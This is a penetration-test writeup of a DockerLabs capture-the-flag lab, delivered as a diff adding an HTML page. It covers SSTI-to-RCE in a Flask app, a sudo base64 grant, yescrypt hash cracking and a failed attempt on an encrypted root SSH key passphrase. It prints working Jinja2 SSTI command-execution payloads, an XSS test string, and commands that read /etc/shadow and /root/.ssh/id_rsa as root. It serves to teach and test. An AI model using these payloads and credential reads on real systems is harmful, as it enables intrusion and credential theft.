@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 36 Verdejo &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Verdejo</p><h1 id="verdejo--writeup">VERDEJO — Writeup</h1>
+<p><strong>Lab:</strong> DockerLabs id 36, <em>Fácil</em> (27th lab in this series)
+<strong>Declared objective:</strong> <em>&quot;Laboratorio para practicar las vulnerabilidades XSS y SSTI, con escalada de privilegios crackeando hashes.&quot;</em>
+<strong>Image:</strong> <code>verdejo:latest</code> (single image, <code>sha256:7ae51e135ff2…</code>, built 2024-05-22, Docker 20.10.25+dfsg1)
+<strong>Engagement date:</strong> 2026-09-29</p>
+<blockquote>
+<p><strong>Redaction note.</strong> Live target material — the recovered password, the full shadow hash, the salt, the key fingerprint and the key material — is redacted in this document. <strong>The structure is not</strong>, because the structure <em>is</em> the finding: the scheme, the field layout, the cost parameters and the salt length are what §4 reasons about, and all of them are shown. A writeup that ships a working credential and a live hash is a writeup that leaks.</p>
+</blockquote>
+<hr />
+<h2 id="1-outcome-first">1. Outcome first</h2>
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Answer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unauthenticated RCE?</td>
+<td><strong>Yes</strong>, as <code>uid=1000(verde)</code> — not root</td>
+</tr>
+<tr>
+<td>Root?</td>
+<td><strong>No.</strong> One conditional hop short: an <strong>encrypted root private key</strong> was obtained, its passphrase was <strong>not</strong> recovered within a stated budget</td>
+</tr>
+<tr>
+<td><code>FLAG{}</code>?</td>
+<td><strong>None. Absence proven by exhaustive search, not assumed</strong></td>
+</tr>
+<tr>
+<td>Was the declared objective true?</td>
+<td><strong>Partly.</strong> XSS and SSTI are both real and both used. The &quot;privilege escalation by cracking hashes&quot; is <strong>half true</strong>: the hash cracks, and cracking it grants <strong>nothing new</strong> — the account it belongs to is the account the SSTI already gave you</td>
+</tr>
+<tr>
+<td>Did the lab's own description lie?</td>
+<td>On the <em>type</em> of vulnerability, <strong>no</strong> — the one thing this series' descriptions usually get wrong, it got right. On the <em>escalation</em>, it overstated the chain</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="2-surface">2. Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- [net-0-20]
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
+8089/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Not shown: 65532 closed tcp ports (conn-refused)
+</code></pre>
+<p>Base OS is <strong>Debian 12 (bookworm)</strong>. Stack pinned from <code>requirements.txt</code>, shipped inside the docroot:</p>
+<pre><code>Flask==2.2.2   itsdangerous==2.1.2   Jinja2==3.1.2
+MarkupSafe==2.1.1   Werkzeug==2.2.2
+</code></pre>
+<p>The container entrypoint is the whole story of the privilege model, and it is worth quoting because it explains the lab's central oddity:</p>
+<pre><code>service apache2 start &amp;&amp; service ssh start \
+  &amp;&amp; su - verde -c &quot;python3 /var/www/html/ssti/__init__.py&quot; &amp;&amp; tail -f /dev/null
+</code></pre>
+<p><strong>The SSTI service is deliberately run as <code>verde</code>, not as root.</strong> The design intent is visible in the Dockerfile the image ships.</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Role</th>
+<th>Identity it runs as</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>8089</td>
+<td>Flask/Jinja2 app, Werkzeug dev server, <code>debug=False</code></td>
+<td><code>verde</code> (uid 1000)</td>
+</tr>
+<tr>
+<td>80</td>
+<td>Apache serving <code>/var/www/html</code> — <strong>including the app's own source, its <code>.git</code>, and its <code>venv/</code></strong></td>
+<td><code>www-data</code></td>
+</tr>
+<tr>
+<td>22</td>
+<td>OpenSSH; server offers <code>publickey, password</code> for <strong>both</strong> <code>root</code> and <code>verde</code></td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="3-attack-chain">3. Attack chain</h2>
+<pre><code>  ?user={{ cycler.__init__.__globals__.os.popen('id').read() }}
+        │  CWE-1336 SSTI, unauthenticated
+        ▼
+  uid=1000(verde) gid=1000(verde) groups=1000(verde)          ← RCE, not root
+        │  sudoers: verde ALL=(root) NOPASSWD: /usr/bin/base64
+        ▼
+  sudo -n /usr/bin/base64 -w0 /etc/shadow                     ← root FILE READ
+  sudo -n /usr/bin/base64 -w0 /root/.ssh/id_rsa                ← root FILE READ
+        │
+        ├──▶ yescrypt hash of `verde` ── cracked ──▶ green-team word (2.3 s)
+        │                                              (grants NOTHING new: already verde)
+        │
+        └──▶ root private key, aes256-ctr + bcrypt r=16 ── passphrase NOT recovered
+                                                          ⇒ root NOT reached
+</code></pre>
+<h3 id="31-ssti--rce-cwe-1336">3.1 SSTI → RCE (CWE-1336)</h3>
+<p>Read first, per §7. The whole bug is three lines of <code>__init__.py</code>:</p>
+<pre><code class="language-python">template = template + '''
+    &lt;h1&gt;Hola {}&lt;/h1&gt;
+    '''.format(user) + footer        # &lt;-- request value spliced into template SOURCE
+...
+return render_template_string(template)   # &lt;-- SOURCE is then COMPILED
+</code></pre>
+<p><code>render_template_string</code> compiles its argument. <code>str.format</code> put attacker bytes <em>into the source</em> before compilation. The safe alternative is <code>render_template(&lt;fixed file&gt;, user=user)</code>.</p>
+<p><strong>Positive control</strong> (evaluation, not reflection):</p>
+<pre><code>?user=hola                  →  &lt;h1&gt;Hola hola&lt;/h1&gt;          (literal)
+?user={{7*7}}               →  &lt;h1&gt;Hola 49&lt;/h1&gt;             (evaluated)
+?user={{''.__class__}}      →  &lt;h1&gt;Hola &amp;lt;class &amp;#39;str&amp;#39;&gt;&lt;/h1&gt;
+</code></pre>
+<p>The third line matters more than the second, and it is the trap. <strong>Jinja2 autoescaping is ON</strong> — the <code>__class__</code> output came back HTML-escaped — and it protects nothing here, because the attack is at the <strong>source</strong> layer, not the output layer. A tester who sees <code>&amp;lt;</code> and concludes &quot;escaping is on, template injection is out&quot; has measured the wrong layer.</p>
+<p><strong>Identity, measured first, as the identity:</strong></p>
+<pre><code>?user={{ cycler.__init__.__globals__.os.popen('id').read() }}
+→ Hola uid=1000(verde) gid=1000(verde) groups=1000(verde)
+</code></pre>
+<p><code>uid=1000</code>, not <code>0</code>. Everything downstream follows from that one line: the sudoers grant is now reachable, and no further hop is needed to become <code>verde</code>.</p>
+<h3 id="32-the-sudoers-grant-this-is-a-read-primitive-not-rce">3.2 The sudoers grant: this is a READ primitive, not RCE</h3>
+<pre><code>$ sudo -n -l            (as verde)
+User verde may run the following commands on 33d7f898585e:
+    (root) NOPASSWD: /usr/bin/base64
+</code></pre>
+<p>The repo's doctrine classifies interpreter grants into <em>argument-taking</em> and <em>runtime-spawned shell</em>, and <strong>both classes are RCE</strong>. <code>base64</code> is a third class that class misses, and misclassifying it is the difference between a Critical and an Information-with-Impact finding.</p>
+<p><strong>The classification test, and it is one command:</strong></p>
+<pre><code>$ sudo -n /usr/bin/base64 --help
+Usage: /usr/bin/base64 [OPTION]... [FILE]
+Base64 encode or decode FILE, or standard input, to standard output.
+  -d, --decode          decode data
+  -i, --ignore-garbage  ...
+  -w, --wrap=COLS       ...
+
+$ sudo -n /usr/bin/base64 -o /tmp/x
+/usr/bin/base64: invalid option -- 'o'
+</code></pre>
+<p><code>base64</code> writes <strong>to standard output only</strong>. It has no output-file option. So the grant confers <strong>root-executed arbitrary file <em>read</em></strong>, and confers no write at all.</p>
+<p><strong>The control that proves the write is not privileged</strong> — the shell redirect belongs to <code>verde</code>, so measuring it is the only way to know which identity performs it:</p>
+<pre><code>$ rm -f /tmp/pwn; printf &quot;aW91ZCAxCg==&quot; | sudo -n /usr/bin/base64 -d &gt; /tmp/pwn
+$ ls -la /tmp/pwn ; stat -c &quot;%U %a&quot; /tmp/pwn
+-rw-r--r-- 1 verde verde 7 /tmp/pwn
+verde 644
+</code></pre>
+<p><strong>The control that proves the path restriction holds</strong> (so the defect is <em>which program was trusted</em>, not &quot;sudo is loose&quot;):</p>
+<pre><code>/usr/bin/base64 --version  → base64 (GNU coreutils) 9.1   rc=0
+/usr/bin/id   /bin/id   /usr/bin/cat   /usr/bin/tee   /bin/sh
+  → sudo: a password is required            (all five)
+</code></pre>
+<h3 id="33-what-the-read-primitive-actually-buys">3.3 What the read primitive actually buys</h3>
+<pre><code>$ sudo -n /usr/bin/base64 -w0 /etc/shadow | base64 -d | grep ^verde
+verde:$y$j9T$&lt;22-char-salt&gt;$&lt;43-char-derived-key&gt;:19864:0:99999:7:::
+
+$ find /root -maxdepth 3            # as verde
+/root                                 # no traversal permission — the grant is what opens it
+
+$ sudo -n /usr/bin/base64 -w0 /root/.ssh/id_rsa &gt; id_rsa.b64
+$ ssh-keygen -lf id_rsa
+4096 SHA256:&lt;redacted&gt; no comment (RSA)
+</code></pre>
+<p><strong>The key is root's, proven by fingerprint, not assumed</strong> (the two fingerprint values are byte-identical — that identity <em>is</em> the proof, so only one is shown, redacted):</p>
+<table>
+<thead>
+<tr>
+<th>Source</th>
+<th>Fingerprint</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>public key recovered from the <strong>encrypted</strong> private file's cleartext region</td>
+<td><code>4096 SHA256:&lt;redacted&gt;</code></td>
+</tr>
+<tr>
+<td><code>/root/.ssh/authorized_keys</code> (read via the grant)</td>
+<td><code>4096 SHA256:&lt;redacted&gt; root@2b3afb1aee62</code></td>
+</tr>
+</tbody>
+</table>
+<p>So the chain to root is <strong>mechanically complete and conditional on one passphrase</strong>. The honest rate is: <em>root is one passphrase away, and the passphrase was not recovered.</em> It is not &quot;root achieved.&quot;</p>
+<h3 id="34-apache-serves-the-source-the-git-and-the-venv-cwe-527--cwe-538">3.4 Apache serves the source, the <code>.git</code>, and the <code>venv</code> (CWE-527 / CWE-538)</h3>
+<p>Unauthenticated, on port 80, no trickery:</p>
+<pre><code>/ssti/.git/HEAD          → 200  21 B     ref: refs/heads/main
+/ssti/.git/config        → 200  283 B
+/ssti/.git/packed-refs   → 200  112 B
+/ssti/.git/index         → 200  918 B
+/ssti/__init__.py        → 200  1141 B   (the vulnerable source, verbatim)
+/ssti/venv/              → 200  (full virtualenv: bin/, lib/, lib64/, pyvenv.cfg)
+</code></pre>
+<p><code>.git/config</code> leaks the internal upstream:</p>
+<pre><code class="language-ini">[remote &quot;origin&quot;]
+	url = https://github.com/filipkarc/ssti-flask-hacking-playground.git
+</code></pre>
+<p>Impact here is low — the app is a public toy — but the two components are separately reportable: <strong>directory contents of a code repository reachable without authentication</strong> (CWE-527) and <strong>internal repository metadata in a publicly accessible file</strong> (CWE-538). A dumb-HTTP <code>git clone</code> does <em>not</em> work (<code>objects/info/packs</code> → 404, <code>git fetch</code> → <code>repository not found</code>), so the <em>history</em> is not exfiltrable; the <em>working tree</em> is, trivially, and that is enough to hand an attacker the exact source of the sink.</p>
+<hr />
+<h2 id="4-the-hash-section">4. The hash section</h2>
+<p>This is the part of the lab the description advertises, and the part the report has to get right. <strong>The credential is evidence; the weakness is the finding.</strong> Both hashes here are at distribution-default cost, so <em>neither</em> is a weak-hash finding — and one of them is worthless as an escalation. Saying that clearly is the deliverable.</p>
+<h3 id="41-verde--etcshadow-yescrypt">4.1 <code>verde</code> — <code>/etc/shadow</code>, <strong>yescrypt</strong></h3>
+<pre><code>verde:$y$j9T$&lt;22-char-salt&gt;$&lt;43-char-derived-key&gt;:19864:0:99999:7:::
+      │  │     │                    │
+      │  │     │                    └── derived key, 43 b64 chars (32 bytes, tlen=32)
+      │  │     └── per-user random salt, 22 chars
+      │  └── parameter triplet
+      └── scheme id: yescrypt (libxcrypt)
+</code></pre>
+<p>Format read: <strong>modular crypt, scheme <code>$y$</code> = yescrypt, salt is 22 chars of per-user random material, and the cost is carried in the <code>j9T</code> parameter triplet rather than in a <code>rounds=</code> field</strong> — which is the structural difference from <code>$2b$</code> bcrypt and the reason an off-the-shelf hashID is the wrong first move here.</p>
+<p><strong>Cost, measured — not read off the parameters:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Quantity</th>
+<th>Measured</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cost per candidate (single core, host libxcrypt, idle)</td>
+<td><strong>21.4 ms</strong></td>
+</tr>
+<tr>
+<td>Cost per candidate (same host, under a concurrent 5-worker sweep)</td>
+<td><strong>11.8 ms</strong> — the box is shared, so quote a range, not a point</td>
+</tr>
+<tr>
+<td>Throughput, single core</td>
+<td><strong>47–90 cand/s</strong></td>
+</tr>
+<tr>
+<td>Cost of the repo's full 517,503-line list, single core</td>
+<td><strong>2.6–3.1 hours</strong></td>
+</tr>
+<tr>
+<td>Throughput with 5 workers</td>
+<td><strong>~170 cand/s</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Is <code>j9T</code> below the distribution default? Measured, and the answer is no.</strong> The parameter triplet looks like a suspiciously small <code>N</code> read as a string, and I was about to file a CWE-916 on exactly that reading. The measurement that refutes it: a <strong>throwaway account created on the same image with the same tool the build used</strong> (<code>useradd</code> + <code>chpasswd</code>) comes out with the <em>identical</em> triplet.</p>
+<pre><code>$ useradd -m probeuser ; echo &quot;probeuser:ProbeControl1&quot; | chpasswd
+$ grep ^probeuser /etc/shadow | cut -d: -f2
+$y$j9T$ciNKlplhoHaSXm.uqJiyF0$c0PftUEJQ4pwRUzsIrjvBl4rr8NmMi9wR5KIuhIptN1
+       ^^^^  identical to the target
+</code></pre>
+<p>That account is also the <strong>positive control for the verifier itself</strong> — a yescrypt hash whose plaintext I chose. Same scheme, same params, <strong>different salt</strong>, which is the per-user property the scheme exists to provide:</p>
+<pre><code>same scheme      : True
+same cost params : True
+same salt        : False    (must be False — the salt is per-user)
+</code></pre>
+<p><strong>Verdict: CWE-916 does not apply.</strong> yescrypt at libxcrypt's own default is a strong KDF. The correct report sentence is <em>&quot;<code>/etc/shadow</code> was readable by a non-root account via the sudoers grant&quot;</em> (CWE-250/732), <strong>not</strong> <em>&quot;a weak hash was cracked&quot;</em>.</p>
+<h3 id="42-root--rootsshid_rsa-aes256-ctr--bcrypt_pbkdf">4.2 <code>root</code> — <code>/root/.ssh/id_rsa</code>, <strong>aes256-ctr + bcrypt_pbkdf</strong></h3>
+<p>This is <strong>not a hash</strong>. It is a passphrase-encrypted private key, and the three inputs are the same three, just in a different container:</p>
+<table>
+<thead>
+<tr>
+<th>Axis</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cipher</td>
+<td><code>aes256-ctr</code></td>
+</tr>
+<tr>
+<td>KDF</td>
+<td><code>bcrypt</code> (bcrypt_pbkdf)</td>
+</tr>
+<tr>
+<td><strong>Cost</strong></td>
+<td><code>rounds = 16</code> → 65,536 — <strong>the OpenSSH default</strong></td>
+</tr>
+<tr>
+<td>Salt</td>
+<td>16 bytes, per key</td>
+</tr>
+<tr>
+<td>Key size</td>
+<td>RSA 4096</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Measured cost: 72 ms/candidate via <code>ssh-keygen</code>, 84 ms in-process.</strong> The repo's 517,503-line list is <strong>10.0 hours</strong> at 42 cand/s on 5 workers.</p>
+<p><strong>The report sentence: the key is <em>exposed</em>; it is not <em>trivially attackable</em>.</strong> A default-cost bcrypt_pbkdf is not CWE-328 and not CWE-916. The finding is the exposure (root's key material readable by a non-root account) plus the fact that the passphrase is a single secret standing between <code>verde</code> and <code>root</code>.</p>
+<h3 id="43-what-the-crack-actually-bought--and-the-number-that-goes-in-the-report">4.3 What the crack actually bought — and the number that goes in the report</h3>
+<pre><code>$ yscan.py shadow.txt verde targeted.txt
+target scheme/params : $j9T$  salt=&lt;22-char-salt&gt;...
+candidates loaded     : 1229
+RESULT hit='&lt;recovered-green-phrase&gt;'  candidates=196  elapsed=2.3s  rate=86.1/s
+</code></pre>
+<p><strong>Confirmed end-to-end — a match on the hash is not the confirmation:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Account</th>
+<th>Password</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>verde</code></td>
+<td><code>&lt;recovered-green-phrase&gt;</code></td>
+<td><strong>LOGIN OK</strong> → <code>uid=1000(verde) gid=1000(verde) groups=1000(verde)</code></td>
+</tr>
+<tr>
+<td><code>verde</code></td>
+<td><code>wrongpass</code></td>
+<td>LOGIN FAILED — <code>AuthenticationException: Authentication failed.</code></td>
+</tr>
+<tr>
+<td><code>root</code></td>
+<td><code>&lt;recovered-green-phrase&gt;</code></td>
+<td>LOGIN FAILED — <code>AuthenticationException: Authentication failed.</code></td>
+</tr>
+<tr>
+<td><code>verde</code></td>
+<td><code>Verdesito</code></td>
+<td>LOGIN FAILED — <code>AuthenticationException: Authentication failed.</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>And here is the finding nobody writes down: this crack is worth nothing.</strong></p>
+<p>The account whose hash was cracked is <code>verde</code> — <strong>and §3.1 had already given me <code>verde</code> as an unauthenticated RCE with no credential at all.</strong> The credential recovered a known-plaintext login to an account I was already inside. The honest rate for this credential in the report is:</p>
+<blockquote>
+<p>196 candidates, 2.3 s, 86 cand/s, against a yescrypt hash at distribution-default cost — <strong>granting no additional reach, because the account it authenticates to was already the identity the unauthenticated primitive ran as.</strong></p>
+</blockquote>
+<p>That is the difference between a lab that says <em>&quot;crack the hash to escalate&quot;</em> and a lab where the hash is a dead end. A pentest report that prints &quot;password recovered&quot; here has measured a self-confirming loop.</p>
+<h3 id="44-the-root-key-passphrase--a-not-recovered-with-numbers">4.4 The root key passphrase — a <strong>not recovered</strong>, with numbers</h3>
+<table>
+<thead>
+<tr>
+<th>Candidate set</th>
+<th>Size</th>
+<th>Result</th>
+<th>Elapsed</th>
+<th>Rate</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>First 1,000 of <code>Passwords.txt</code></td>
+<td>1,000</td>
+<td>0 hits</td>
+<td>21.8 s</td>
+<td>45.9/s</td>
+</tr>
+<tr>
+<td>Targeted, lab vocabulary</td>
+<td>1,229</td>
+<td>0 hits</td>
+<td>26.5 s</td>
+<td>46.5/s</td>
+</tr>
+<tr>
+<td>Targeted v2, high-frequency core + mutations</td>
+<td>6,227</td>
+<td>0 hits</td>
+<td>248.8 s</td>
+<td>25.0/s</td>
+</tr>
+<tr>
+<td>Lab-relevance filter over the 517,503 list</td>
+<td>3,400</td>
+<td>0 hits</td>
+<td>137.2 s</td>
+<td>24.8/s</td>
+</tr>
+<tr>
+<td>Mutations of the credential recovered from <code>/etc/shadow</code></td>
+<td>361</td>
+<td>0 hits</td>
+<td>16.6 s</td>
+<td>21.7/s</td>
+</tr>
+<tr>
+<td><code>Passwords.txt</code>, walked from the top and <strong>stopped at 100,000</strong></td>
+<td>100,000</td>
+<td>0 hits</td>
+<td>2,461.5 s</td>
+<td>40.6/s</td>
+</tr>
+<tr>
+<td><strong>Total</strong></td>
+<td><strong>112,217</strong></td>
+<td><strong>0 hits</strong></td>
+<td>~2,913 s</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Not recovered.</strong> Two things go in the report, and the second is the one clients actually read.</p>
+<p><em>What was covered:</em> 100,000 of the 517,503 lines of <code>Passwords.txt</code> — <strong>19.3%</strong>, walked from the top of a <strong>lexicographic</strong> file, so the region it reached is roughly <code>0</code>–<code>d</code>; plus 11,217 targeted candidates across four themed sets. <strong>What was not:</strong> the remaining 417,503 lines, whose projection at the measured 40.6 cand/s is <strong>2.9 further hours</strong> (<strong>3.5 h</strong> to exhaust the list), and the two other repo lists (<code>sorted-passwords.txt</code> 101,074, <code>2025-sort-uniq-words.txt</code> 131,887) at ~42 min and ~52 min. No <code>john</code>, no <code>hashcat</code> on this host, so every rate above is CPU-only Python and understates what a GPU would do.</p>
+<p><strong>The stop was a budget decision, and this is the sentence that belongs in the report:</strong></p>
+<blockquote>
+<p>The root private key's passphrase was <strong>not recovered</strong> after 112,217 candidates at 20–47 cand/s (2,461 s of the largest single pass). Exhaustive coverage of the available wordlist would require a further <strong>~2.9 hours</strong> of 5-core compute. Offline cracking is the only technique in this engagement whose cost scales directly with the target, and the projection — not the failure count — is the deliverable. <strong>Root is one passphrase away: the key↔<code>authorized_keys</code> pairing is proven by matching fingerprint, and the passphrase is the only thing between <code>verde</code> and <code>root</code>.</strong></p>
+</blockquote>
+<hr />
+<h2 id="5-control-tests">5. Control tests</h2>
+<p>Every oracle in this engagement ran a <strong>positive</strong> and a <strong>negative</strong> control before its output was allowed to mean anything. Three of these failed and had to be fixed — see §6.</p>
+<h3 id="51-ssti-oracle">5.1 SSTI oracle</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Test</th>
+<th>Expected</th>
+<th>Observed</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>?user=hola</code></td>
+<td>literal <code>Hola hola</code></td>
+<td><code>Hola hola</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>?user={{7*7}}</code></td>
+<td><code>Hola 49</code></td>
+<td><code>Hola 49</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>?user={{''.__class__}}</code></td>
+<td>escaped, proves autoescape ≠ safety</td>
+<td><code>Hola &amp;lt;class &amp;#39;str&amp;#39;&gt;</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>?user=&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>raw reflection in an HTML text node</td>
+<td><code>&lt;h1&gt;Hola &lt;script&gt;alert(1)&lt;/script&gt;&lt;/h1&gt;</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>5</td>
+<td>gadget, <strong>identity first</strong></td>
+<td>non-root</td>
+<td><code>uid=1000(verde) gid=1000(verde) groups=1000(verde)</code></td>
+<td>pass</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The XSS half of the declared objective is real, and it is a separate finding from the SSTI half</strong> even though both flow from one <code>.format()</code>. The sink-context test is what separates them: the <code>&lt;script&gt;</code> tag is reflected <strong>raw</strong> into an HTML text node (escaping was bypassed because the bytes never passed through an escaper — they were spliced into the source), while <code>{{…}}</code> <strong>compiles and runs</strong>. Reflection alone would not have been enough; the <code>7*7 → 49</code> is what makes it SSTI, and the raw <code>&lt;script&gt;</code> is what makes it also XSS.</p>
+<h3 id="52-cracker-oracles--positive-and-negative">5.2 Cracker oracles — positive <strong>and</strong> negative</h3>
+<p>Two self-made encrypted control keys, built with the <strong>same scheme, cipher and cost as the target</strong> (<code>aes256-ctr</code>, <code>bcrypt_pbkdf</code>, <code>rounds=16</code>, RSA 2048), so the oracle is validated against the exact class it will be asked about:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Test</th>
+<th>Expected</th>
+<th>Observed</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C1</td>
+<td><code>paramiko</code> recovers <code>ctl1</code>'s own passphrase</td>
+<td><code>True</code></td>
+<td><code>True</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C2</td>
+<td><code>ssh-keygen -y -P</code> recovers <code>ctl1</code>'s own passphrase</td>
+<td><code>True</code></td>
+<td><code>True</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C3</td>
+<td><code>paramiko</code> rejects a wrong passphrase on <code>ctl1</code></td>
+<td><code>False</code></td>
+<td><code>False</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C4</td>
+<td><strong>negative</strong>: <code>ctl2</code> must not accept <code>ctl1</code>'s passphrase</td>
+<td><code>False</code></td>
+<td><code>False</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C5</td>
+<td><strong>negative</strong>: the target must not accept either control passphrase</td>
+<td><code>False</code></td>
+<td><code>False</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C6</td>
+<td><strong>end-to-end positive</strong>: run the <em>scanner</em> over a list containing the answer</td>
+<td>exactly 1 recovery, at position 3</td>
+<td><code>hit='KnownPass1' after 3 candidates</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C7</td>
+<td><strong>end-to-end negative</strong>: run the scanner over a list without it</td>
+<td>exactly 0 recoveries</td>
+<td><code>None after 4 candidates</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C8</td>
+<td>yescrypt verifier recovers the control account's known plaintext</td>
+<td><code>True</code></td>
+<td><code>True</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C9</td>
+<td>yescrypt verifier rejects a near-miss</td>
+<td><code>False</code></td>
+<td><code>False</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C10</td>
+<td><strong>negative</strong>: control plaintext must not verify against the target hash</td>
+<td><code>False</code></td>
+<td><code>False</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C11</td>
+<td>identity check: <code>sudo /usr/bin/base64</code> allowed</td>
+<td><code>rc=0</code></td>
+<td><code>base64 (GNU coreutils) 9.1</code>, <code>rc=0</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C12</td>
+<td>identity check: <code>sudo /usr/bin/id</code>, <code>/bin/id</code>, <code>cat</code>, <code>tee</code>, <code>/bin/sh</code></td>
+<td>all <code>sudo: a password is required</code></td>
+<td>all five denied</td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C13</td>
+<td>write-identity: the redirect's owning uid</td>
+<td><strong>not</strong> root</td>
+<td><code>verde 644</code></td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C14</td>
+<td>cost-parameter identity: a fresh account on the same image</td>
+<td>same triplet as target</td>
+<td><code>$y$j9T$</code> on both</td>
+<td>pass</td>
+</tr>
+<tr>
+<td>C15</td>
+<td>key-pairing identity: the public key in the encrypted file vs <code>authorized_keys</code></td>
+<td>identical fingerprint</td>
+<td><code>SHA256:3TOl…998</code> on both</td>
+<td>pass</td>
+</tr>
+</tbody>
+</table>
+<p><strong>C6/C7 are the shape that matters.</strong> C1–C5 validate the <em>oracle</em>; C6/C7 validate the <em>scanner that calls it</em>. They are different things, and §6 is the reason I do not treat the first as sufficient.</p>
+<p><strong>Postcondition stated as a count identity, not a verdict:</strong> for any run, <em>recoveries returned</em> must equal <em>hashes known to be in the candidate list</em>. C6 gave 1 == 1. C7 gave 0 == 0. Had the wiring been broken, both sides would have been 0 == 0 and looked identical to a target that resisted — which is exactly what happened once, and is written up next.</p>
+<h3 id="53-the-control-that-held-and-is-a-finding-in-the-defenders-favour">5.3 The control that <strong>held</strong>, and is a finding in the defender's favour</h3>
+<ul>
+<li><strong><code>PermitRootLogin</code> was not weakened.</strong> <code>/etc/ssh/sshd_config</code> sets no <code>PermitRootLogin</code>, and the live server offers <code>publickey, password</code> for <code>root</code> — i.e. Debian's <code>prohibit-password</code> default. So root login is <em>possible by key</em> and <em>not by password</em>; the negative control <code>root / &lt;recovered-green-phrase&gt; → LOGIN FAILED</code> is this control working, not a missing hash.</li>
+<li><strong>The sudoers path restriction held</strong> (C12). The grant names one binary; five neighbours were denied.</li>
+<li><strong><code>base64</code> genuinely has no write primitive</strong> (C13), so the escalation did not exist and no amount of payload engineering would have produced one.</li>
+<li><strong>No SUID, no capabilities, no cron, no Docker socket.</strong> <code>find / -perm -4000 -o -perm -2000</code> returned the stock Debian set; <code>getcap -r /</code> returned nothing; <code>/etc/cron.d</code> held only <code>e2scrub_all</code>; <code>/var/run/docker.sock</code> does not exist. <strong>The privilege boundary held everywhere except the one sudoers line</strong> — which is why the honest chain length is a property of the lab, not a guess.</li>
+</ul>
+<hr />
+<h2 id="6-autocorrección--three-things-i-got-wrong-and-what-caught-them">6. Autocorrección — three things I got wrong, and what caught them</h2>
+<p>Written prominently because all three produced a <em>confident, publishable, wrong</em> result, and two of them would have become findings.</p>
+<h3 id="61-i-was-about-to-file-cwe-916-on-a-hash-that-is-at-default-cost">6.1 I was about to file CWE-916 on a hash that is at default cost</h3>
+<p><strong>What I believed:</strong> the parameter triplet <code>j9T</code> decodes to a small <code>N</code> (the encoding is <code>N = 1 &lt;&lt; (param[0] &amp; 0x3F)</code>, which reads as a low work factor), so yescrypt here is configured below the distribution default → <strong>CWE-916, Use of Password Hash With Insufficient Computational Effort</strong>.</p>
+<p><strong>Why the belief was wrong:</strong> the triplet is libxcrypt's <em>own default</em>. I inferred a weakness from a parameter <strong>string</strong> without ever measuring the cost.</p>
+<p><strong>What caught it:</strong> C14 — a throwaway account created on the same image with the same tool the build used. Identical triplet. The CWE-916 finding was deleted before it was ever written.</p>
+<blockquote>
+<p><strong>Rule:</strong> a KDF parameter is not a finding until you have compared it to a <strong>measured</strong> baseline produced by the <em>same distribution, same tool, same version</em>. Reading <code>N=512</code> off a parameter string and calling it weak is the same move as reading a status code and calling it vulnerable.</p>
+<p><strong>And the cheap way to get the baseline is a control you build in a throwaway instance, not a document you look up</strong> — because the document tells you the upstream default while the target may have been reconfigured, and here the target <em>was not</em>, and I would have reported a finding that did not exist.</p>
+</blockquote>
